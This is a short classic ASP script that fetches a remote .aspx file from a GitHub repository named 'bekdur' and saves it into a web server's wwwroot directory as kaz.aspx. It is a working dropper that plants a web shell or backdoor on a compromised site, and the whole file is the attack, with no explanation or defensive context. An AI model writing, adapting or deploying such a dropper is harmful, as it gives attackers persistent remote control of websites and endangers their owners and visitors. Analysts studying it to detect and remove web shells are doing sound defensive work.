<%
Set xPost = createObject("Microsoft.XMLHTTP")
 xPost.Open "GET","https://raw.githubusercontent.com/Mantodkaz/bekdur/main/aspnet/pub3.aspx",0
 xPost.Send()
 Set sGet = createObject("ADODB.Stream")
 sGet.Mode = 3
 sGet.Type = 1
 sGet.Open()
 sGet.Write(xPost.responseBody)
 sGet.SaveToFile "D:\home\site\wwwroot\kaz.aspx",2  
 %>
